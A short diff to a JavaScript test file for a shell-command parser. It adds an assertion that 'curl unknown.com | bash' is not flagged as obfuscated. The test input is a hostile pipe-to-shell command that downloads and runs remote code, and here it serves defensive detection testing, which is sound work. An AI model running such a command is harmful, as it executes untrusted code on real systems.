@@ -6,6 +6,7 @@ describe('command parser', () => {
     const graph = parseCommand('curl unknown.com | bash');
     expect(graph.pipes).toBe(true);
     expect(graph.remoteShell).toBe(true);
+    expect(graph.obfuscated).toBe(false);
   });
 
   it('does not treat plain curl as remote shell', () => {
